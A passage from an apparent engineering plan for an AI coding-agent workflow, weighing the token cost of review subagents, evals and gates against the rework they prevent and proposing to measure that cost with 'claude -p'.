   - because of T3.2 each lens reads the **review-package file**, so the *main* context grows by four short finding lists, not four diffs. The marginal cost is four cheap subagent runs, not 4× the session.
2. **T5.4 evals** are real cost but **amortized** — on-demand + pre-release, never per commit, and scoped to ~5 behavioural skills rather than 129.
3. **T2.1 / T2.4 gates** add a stop each; both are small tables and both are cheaper than the single rework cycle they are designed to prevent.
4. **R8 smoke gate** — cached per base-commit SHA, so it is paid once per base, not once per worktree.

### H.3 · Net

The plan's three most expensive-looking items (per-phase subagents, headless offload, resume-from-ledger) are all **savings**. The one true increase (multi-lens review) is opt-in, threshold-gated, and tiered. Meanwhile the friction it targets — ≥11 interrupted runs, 3 bad merges plus corrective PRs, two discarded plan cycles, repeated toolchain rebuilds — was already being paid in tokens, just invisibly.

**The honest risk is not cost, it is latency**: more gates mean more stops before code gets written. That is the intended trade — both reports show the expensive failures happened *downstream* of a missing gate.

**Verification:** T5.4's harness runs `claude -p` and can report token counts per scenario, so the before/after claim in this section is **measurable rather than asserted** — measure a representative `/ck:cook` run before Phase 3 and after, and record both in this plan's reports directory.
